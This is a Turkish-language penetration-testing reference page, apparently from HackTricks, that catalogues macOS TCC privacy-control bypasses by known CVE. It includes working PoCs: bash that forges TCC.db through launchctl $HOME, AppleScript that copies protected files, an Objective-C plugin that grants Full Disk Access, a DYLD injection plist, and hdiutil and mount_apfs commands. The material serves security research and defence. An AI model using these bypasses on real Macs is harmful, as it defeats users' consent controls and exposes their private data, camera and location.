# macOS TCC Bypass'leri

{{#include ../../../../../banners/hacktricks-training.md}}

## İşlevselliğe göre

### Write Bypass

Bu bir bypass değildir; yalnızca TCC'nin nasıl çalıştığını gösterir: **Yazmaya karşı koruma sağlamaz**. Terminal'in **bir kullanıcının Desktop'ını okuma erişimi yoksa bile Desktop'a yazabilir**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`**, yeni **file**'a **creators app**'in dosyayı okumasına erişim vermek için eklenir.

### TCC ClickJacking

Kullanıcının fark etmeden **kabul etmesini** sağlamak için **TCC prompt'unun üzerine bir pencere yerleştirmek** mümkündür. Bir PoC'yi [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** üzerinde bulabilirsiniz.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker, **`Info.plist`** içinde **herhangi bir ada** (ör. Finder, Google Chrome...) sahip **apps** oluşturabilir ve bunların bazı TCC protected konumlara erişim istemesini sağlayabilir. Kullanıcı, bu erişimi isteyenin legitimate application olduğunu düşünecektir.\
Ayrıca, legitimate app'i Dock'tan **kaldırıp fake olanı Dock'a yerleştirmek** mümkündür. Böylece kullanıcı, aynı icon'u kullanabilen fake app'e tıkladığında fake app legitimate app'i çağırabilir, TCC permissions isteyebilir ve bir malware çalıştırabilir. Bu da kullanıcının erişimi isteyenin legitimate app olduğuna inanmasını sağlar.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Daha fazla bilgi ve PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Varsayılan olarak **SSH üzerinden erişim "Full Disk Access"** yetkisine sahipti. Bunu disable etmek için erişimin listede bulunması ancak disabled olması gerekir (listeden kaldırmak bu privileges'ları kaldırmaz):<sup>[2]</sup>

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

Burada bazı **malware'lerin bu protection'ı bypass edebildiğine** dair örnekler bulabilirsiniz:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[11]</sup>

> [!CAUTION]
> Artık SSH'ı enable edebilmek için **Full Disk Access** gerektiğini unutmayın.

### Handle extensions - CVE-2022-26767

**`com.apple.macl`** attribute'u, **belirli bir application'a dosyayı okuma permissions'ı vermek için** dosyalara atanır. Bu attribute, bir dosya **drag\&drop** ile bir app'in üzerine bırakıldığında veya kullanıcı bir dosyayı **default application** ile açmak için **double-click** yaptığında set edilir.

Bu nedenle bir user, tüm extensions'ları handle edecek **malicious app'i register** edebilir ve herhangi bir dosyayı **open** etmek için Launch Services'i çağırabilir (böylece malicious file'a dosyayı okuma access'i verilir).

### iCloud

**`com.apple.private.icloud-account-access`** entitlement'ı sayesinde **`com.apple.iCloudHelper`** XPC service ile iletişim kurularak **iCloud tokens** alınabilir.

**iMovie** ve **Garageband** bu entitlement'a ve buna izin veren diğer entitlement'lara sahipti.

Bu entitlement'tan **icloud tokens almak** için kullanılan exploit hakkında daha fazla **information** için şu konuşmaya bakın: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[12]</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission'ına sahip bir app, **diğer Apps'leri control edebilir**. Bu, **diğer Apps'lere verilen permissions'ları abuse edebileceği** anlamına gelir.

Apple Scripts hakkında daha fazla bilgi için:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Örneğin, bir App'in **`iTerm` üzerinde Automation permission'ı** varsa; bu örnekte **`Terminal`**, iTerm üzerinde access'e sahiptir:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA'e sahip olmayan Terminal, FDA'e sahip olan iTerm'i çağırabilir ve actions gerçekleştirmek için onu kullanabilir:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder Üzerinden

Ya da bir App Finder üzerinden erişime sahipse, bunun gibi bir script olabilir:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## App Davranışına Göre

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Userland **tccd daemon**, TCC users database'ine şu konumdan erişmek için **`HOME`** **env** değişkenini kullanıyordu: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[this Stack Exchange gönderisine](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) göre ve TCC daemon'ı mevcut kullanıcının domain'i içinde `launchd` aracılığıyla çalıştığından, kendisine aktarılan **tüm environment variable'ları kontrol etmek** mümkündür.\
Böylece bir **attacker**, **`launchctl`** içinde **`$HOME` environment** değişkenini **kontrolündeki** bir **directory**'yi gösterecek şekilde ayarlayabilir, **TCC** daemon'ını yeniden başlatabilir ve ardından son kullanıcıdan hiçbir zaman onay istemeden kendisine **kullanılabilir tüm TCC entitlement'larını** vermek için **TCC database'ini doğrudan değiştirebilir**.<sup>[1]</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notlar

Notes, TCC korumalı konumlara erişebiliyordu; ancak bir not oluşturulduğunda bu **korumasız bir konumda oluşturulur**. Bu nedenle Notes'tan korumalı bir dosyayı bir nota (yani korumasız bir konuma) kopyalamasını isteyebilir ve ardından dosyaya erişebilirdiniz:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate` kütüphanesini kullanan `/usr/libexec/lsd` binary'si, **nullfs** mount oluşturmasına izin veren `com.apple.private.nullfs_allow` entitlement'ına ve her dosyaya erişebilmesini sağlayan **`kTCCServiceSystemPolicyAllFiles`** içeren `com.apple.private.tcc.allow` entitlement'ına sahipti.

"Library" konumuna quarantine attribute eklemek, **`com.apple.security.translocation`** XPC service'ini çağırmak ve ardından Library'yi **`$TMPDIR/AppTranslocation/d/d/Library`** konumuna map etmek mümkündü; böylece Library içindeki tüm dokümanlara **erişilebilirdi**.

### CVE-2024-44131 - FileProvider symlink race

Dosya işlemlerini **privileged helper**'a devreden uygulamalar (burada **`fileproviderd`** / **`Files.app`**), öğeleri **kullanıcı adına** kopyalar veya taşır; dolayısıyla kopyalama işlemi çağrıyı yapan uygulamanın yerine helper'ın yetkileriyle çalışır.

Jamf Threat Labs, işlemden önce gerçekleştirilen symlink doğrulamasının **race edilebildiğini** gösterdi: saldırgan, kontrol edilen **son** path bileşenine symlink yerleştirmek yerine, kopyalama başladıktan **sonra** path'in **ara** dizinlerinden birini değiştirir. Ardından privileged helper, saldırganın kontrol ettiği linki takip ederek hiçbir zaman prompt göstermeden TCC korumalı konumları okur/yazar.<sup>[7]</sup>

Path'lerinde random UUID ile **korunmayan** dizinler (örneğin `~/Library/Mobile Documents/com~apple~CloudDocs`) en kolay hedeflerdir; çünkü saldırgan race gerçekleştirmek için gereken tam path'i öngörebilir.

> [!TIP]
> Aranması gereken genel pattern şudur: **bir path'i birden fazla kez çözen herhangi bir privileged process** (check-then-use veya `rename()`/`copyfile()` işlemlerinin source ve destination'ı ayrı ayrı çözmesi), path'in ortasındaki bir dizin değiştirilerek race edilebilir. Yalnızca `O_NOFOLLOW_ANY`, önceden açılmış bir directory FD üzerinde `openat()` kullanımı veya `realpath()` + yeniden doğrulama bu aralığı gerçekten kapatır.

Daha fazla bilgi için [**Jamf Threat Labs yazısı**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[7]</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3`, environment variable'lar tarafından kontrol edilen bir logging hook ekleyen `SQLITE_ENABLE_SQLLOG` ile build edilebilir ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[8]</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **açılan her database** için **database file'ın bir kopyası** ve SQL statement'larının log'u `path` içine yazılır (dizinin önceden mevcut olması gerekir).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – Bir DB her açıldığında/attach edildiğinde mevcut dosyayı yeniden kullanmak yerine **yeni bir kopya** oluşturur.
- **`SQLITE_SQLLOG_CONDITIONAL`** – yalnızca ana DB'nin yanında bir `<database>-sqllog` file'ı varsa bir connection log'lanır.

Bu variable'ı FDA'ya sahip olan ve SQLite database'lerini açan bir process'e inject edebilirseniz, korumalı database'leri kontrol ettiğiniz bir directory'ye **kopyalar**. Destination filename saldırganın kontrol ettiği verilerden türetildiği için destination'a yerleştirilen bir symlink, aynı primitive'i hedef process'in privileges'ı ile **arbitrary file write** işlemine dönüştürür.

### **SQLITE_AUTO_TRACE**

`SQLITE_AUTO_TRACE` environment variable'ı ayarlanırsa `libsqlite3.dylib` library'si tüm SQL query'lerini **log'lamaya** başlar. Birçok application bu library'yi kullandığından, bunların tüm SQLite query'lerini log'lamak mümkün olurdu.

Birçok Apple application'ı TCC korumalı bilgilere erişmek için bu library'yi kullanıyordu.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### env-var driven file writes arama

Önceki iki giriş aynı generic technique'in örnekleridir ve daha fazlasını aramak faydalıdır: **TCC-privileged uygulamalara yüklenen framework'ler, çoğu zaman sürecin caller-controlled bir path'te dosya oluşturmasını sağlayan debug/logging environment variable'larını açığa çıkarır**.

Bunları bulmak için workflow:

1. FDA veya başka bir ilgi çekici TCC permission'ına sahip bir target seçin (`Music`, `TV`, `Terminal`, MDM agents...) ve linklediği framework'leri listeleyin (`otool -L`, `vmmap`).
2. Bu framework'lerde `getenv` string'lerini grep'leyin: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Aday variable'ları `launchctl setenv NAME /path/you/control` ile ayarlayın, uygulamayı başlatın ve `fs_usage -w -f filesys <pid>` veya `sudo fs_usage | grep <path>` ile filesystem üzerinde ne yaptığını izleyin.
4. Süreç sizin directory'nizde bir dosya **oluşturuyor veya yeniden adlandırıyorsa**, bir write primitive elde etmişsiniz demektir: hedefi bir symlink'e yönlendirin (veya yukarıdaki CVE-2024-44131 örneğinde olduğu gibi bir intermediate directory üzerinde race yapın) ve dosyayı `~/Library/Application Support/com.apple.TCC/TCC.db` üzerine yönlendirin.

> [!TIP]
> Bunu sınırlayan iki husus vardır. İlk olarak, uygulama [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement'ını ("uygulamanın, uygulamanızın process'ine code inject etmek için kullanabileceğiniz dynamic linker environment variable'larından etkilenip etkilenemeyeceğini belirten bir Boolean value") taşımadıkça **`DYLD_*` variable'ları hardened-runtime binary'leri tarafından yok sayılır** — ayrıca bkz. [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). İkinci olarak Apple, framework debug variable'larını bildirildikçe tek tek kaldırır; bu nedenle bir macOS release'inde çalışan bir variable çoğu zaman sonraki release'te yoktur. Bir variable ayarladıktan sonra uygulama sessizce başlatmayı reddederse, bu variable'ı zaten filtrelenmiş olarak değerlendirin.

Linker variable'larıyla yapılan eşdeğer trick için [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) bölümüne bakın.

### Apple Remote Desktop

Root olarak bu service'i etkinleştirebilirdiniz ve **ARD agent'ı full disk access'a sahip olurdu**; ardından bir user tarafından yeni bir **TCC user database** kopyalamaya zorlanabilirdi.

## **NFSHomeDirectory** aracılığıyla

TCC, user'a özgü resource'lara erişimi kontrol etmek için user'ın HOME folder'ında **$HOME/Library/Application Support/com.apple.TCC/TCC.db** konumunda bir database kullanır.\
Bu nedenle user, $HOME env variable'ının **farklı bir folder'ı** göstermesiyle TCC'yi yeniden başlatmayı başarırsa, user **/Library/Application Support/com.apple.TCC/TCC.db** içinde yeni bir TCC database oluşturabilir ve TCC'yi herhangi bir app'e herhangi bir TCC permission vermesi için kandırabilir.

> [!TIP]
> Apple'ın **`NFSHomeDirectory`** attribute'unda user profile içinde saklanan ayarı **`$HOME` değerinin** kaynağı olarak kullandığını unutmayın; bu nedenle bu değeri değiştirme permission'ına (**`kTCCServiceSystemPolicySysAdminFiles`**) sahip bir application'ı compromise ederseniz, bu seçeneği bir TCC bypass ile **weaponize** edebilirsiniz.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**İlk POC**, user'ın **HOME** folder'ını değiştirmek için [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ve [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kullanır.

1. Target app için bir _csreq_ blob'u alın.
2. Gerekli access ve _csreq_ blob'u ile sahte bir _TCC.db_ dosyası yerleştirin.
3. User'ın Directory Services entry'sini [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ile export edin.
4. User'ın home directory'sini değiştirmek için Directory Services entry'sini düzenleyin.
5. Değiştirilmiş Directory Services entry'sini [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) ile import edin.
6. User'ın _tccd_'sini durdurun ve process'i reboot edin.

İkinci POC, `kTCCServiceSystemPolicySysAdminFiles` değerine sahip `com.apple.private.tcc.allow` entitlement'ı bulunan **`/usr/libexec/configd`** kullanıyordu.\
`configd`'yi **`-t`** option'ı ile çalıştırmak mümkündü; bir attacker **custom Bundle yüklemek** belirtebilirdi. Bu nedenle exploit, user'ın home directory'sini değiştiren **`dsexport`** ve **`dsimport`** method'larını bir **`configd` code injection** ile **değiştirir**.

Daha fazla bilgi için [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) sayfasına bakın.<sup>[13]</sup>

## Process injection aracılığıyla

Bir process'in içine code inject etmek ve TCC privilege'larını abuse etmek için farklı technique'ler vardır:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Ayrıca TCC'yi bypass etmek için bulunan en yaygın process injection, **plugin'ler (load library)** aracılığıyladır.\
Plugin'ler genellikle library veya plist biçimindeki ve **main application tarafından yüklenerek** onun context'i altında çalıştırılan ek code'lardır. Bu nedenle main application'ın TCC restricted file'lara erişimi varsa (verilmiş permission'lar veya entitlement'lar aracılığıyla), **custom code da aynı erişime sahip olur**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` application'ı **`kTCCServiceSystemPolicySysAdminFiles`** entitlement'ına sahipti, **`.daplug`** extension'ına sahip plugin'ler yüklüyor ve **hardened** runtime'a sahip değildi.

Bu CVE'yi weaponize etmek için TCC'yi bypass etmek amacıyla **user'ların TCC database'ini ele geçirebilmek** üzere **`NFSHomeDirectory`** değiştirilir (önceki entitlement abuse edilerek).

Daha fazla bilgi için [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) sayfasına bakın.<sup>[14]</sup>

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary'si `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` entitlement'larına sahipti. İlki **code injection'a izin veriyor**, ikincisi ise ona **TCC'yi manage etme access'i** veriyordu.

Bu binary, `/Library/Audio/Plug-Ins/HAL` folder'ından **third party plug-in'leri** yüklemeye izin veriyordu. Bu nedenle şu POC ile **bir plugin yüklemek ve TCC permission'larını abuse etmek** mümkündü:<sup>[15]</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) bakın.<sup>[15]</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O üzerinden kamera akışını açan system uygulamaları (**`kTCCServiceCamera`** içeren uygulamalar), `/Library/CoreMediaIO/Plug-Ins/DAL` konumunda bulunan bu plugin'leri process'e yükler (SIP tarafından kısıtlanmaz).

Oraya common **constructor** içeren bir library yerleştirmek **code inject** etmek için yeterlidir.

Birkaç Apple uygulaması buna karşı vulnerable durumdaydı.

### Firefox

Firefox uygulamasında `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` entitlement'ları bulunuyordu:<sup>[16]</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Bu yöntemin nasıl kolayca exploit edilebileceği hakkında daha fazla bilgi için [**orijinal rapora bakın**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[16]</sup>

### CVE-2020-10006

`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` binary'si **`com.apple.private.tcc.allow`** ve **`com.apple.security.get-task-allow`** entitlements'larına sahipti; bu da process içine code inject edilmesini ve TCC privileges'larının kullanılmasını mümkün kılıyordu.

### CVE-2023-26818 - Telegram

Telegram, **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** entitlements'larına sahipti. Bu nedenle, örneğin camera ile recording yapmak gibi **izinlerine access elde etmek** için Telegram'ın abuse edilmesi mümkündü. [**Payload'ı writeup'ta bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[17]</sup>

Bir library yüklemek için env variable'ın nasıl kullanıldığına dikkat edin: Bu library'yi inject etmek amacıyla **özel bir plist** oluşturuldu ve bunu launch etmek için **`launchctl`** kullanıldı:<sup>[17]</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## open çağrılarıyla

Sandboxed durumdayken bile **`open`** çağrısı yapmak mümkündür.

### Terminal Scripts

Özellikle teknik kişiler tarafından kullanılan bilgisayarlarda terminal'e **Full Disk Access (FDA)** vermek oldukça yaygındır. Bununla **`.terminal`** script'lerini çağırmak da mümkündür.

**`.terminal`** script'leri, çalıştırılacak komutun **`CommandString`** anahtarında bulunduğu aşağıdaki gibi plist dosyalarıdır:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Bir uygulama /tmp gibi bir konuma bir terminal betiği yazabilir ve bunu şu tür bir komutla çalıştırabilir:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Mount ederek

### CVE-2020-9771 - mount_apfs TCC bypass ve privilege escalation

**Herhangi bir kullanıcı** (ayrıcalıksız olanlar bile) bir Time Machine snapshot'ı oluşturup mount edebilir ve bu snapshot'taki **TÜM dosyalara erişebilir**.\
Gerekli olan **tek ayrıcalık**, kullanılan uygulamanın (örneğin `Terminal`) bir admin tarafından verilmesi gereken **Full Disk Access** (FDA) erişimine (`kTCCServiceSystemPolicyAllfiles`) sahip olmasıdır.<sup>[2]</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Daha ayrıntılı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

TCC DB file korumalı olsa bile, **dizinin üzerine** yeni bir TCC.db file mount etmek mümkündü:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**full exploit**'i [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) içinde inceleyin.

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2) içinde açıklandığı üzere, bu CVE `diskarbitrationd`'yi abuse ediyordu.<sup>[18]</sup>

Public `DiskArbitration` framework'ündeki `DADiskMountWithArgumentsCommon` fonksiyonu security check'lerini gerçekleştiriyordu. Ancak doğrudan `diskarbitrationd` çağrılarak bu kontrolleri bypass etmek ve bu nedenle path içinde `../` öğeleri ile symlink'ler kullanmak mümkündü.

Bu, bir attacker'ın `diskarbitrationd`'nin `com.apple.private.security.storage-exempt.heritable` entitlement'ı sayesinde TCC database'i üzerine mount etmek dahil olmak üzere herhangi bir konumda arbitrary mount işlemleri gerçekleştirmesine olanak tanıyordu.

### asr

**`/usr/sbin/asr`** tool'u, tüm diski kopyalayarak başka bir konuma mount etmeye ve TCC protections'ı bypass etmeye olanak tanıyordu.

### CVE-2022-22655 - Location Services

Location Services, diğer servisler gibi bir TCC database içinde **stored** değildir. Kendi allow-list'ini **`/var/db/locationd/clients.plist`** içinde tutan `locationd` tarafından yönetilir:<sup>[5]</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Her giriş, client (bundle ID veya executable path) tarafından anahtarlanır ve `Authorized`, `BundleId`, `Executable` ve `Registered` gibi alanları içerir.

`clients.plist` dosyası Sandbox/TCC tarafından korunur ve root olarak bile düzenlenemez — ancak **`/var/db/locationd/` directory'si mounting işlemine karşı korunmuyordu**. Bu nedenle root olarak çalışan bir attacker, kendi `clients.plist` dosyasını içeren bir disk image oluşturabilir (binary'si `Authorized` olarak işaretlenmiş şekilde), bunu directory'nin üzerine mount edebilir ve forged allow-list'in etkinleşmesi için `locationd`'yi restart edebilirdi.<sup>[5]</sup>

> [!TIP]
> Bu, yukarıdaki `hdiutil`/`mount` TCC bypass'leriyle aynı pattern'dir: *file* korunur, file'ın bulunduğu *directory* korunmaz; bu nedenle file yerine tüm directory'yi replace edersiniz.

## Başlangıç uygulamaları aracılığıyla


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep ile

Birçok durumda dosyalar email'ler, phone number'lar, mesajlar... gibi sensitive information'ı protected olmayan location'larda saklar (Apple'a göre bunlar vulnerability olarak kabul edilir).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Bu artık çalışmıyor, ancak [**geçmişte çalışıyordu**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) kullanmanın başka bir yolu:<sup>[19]</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referanslar

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
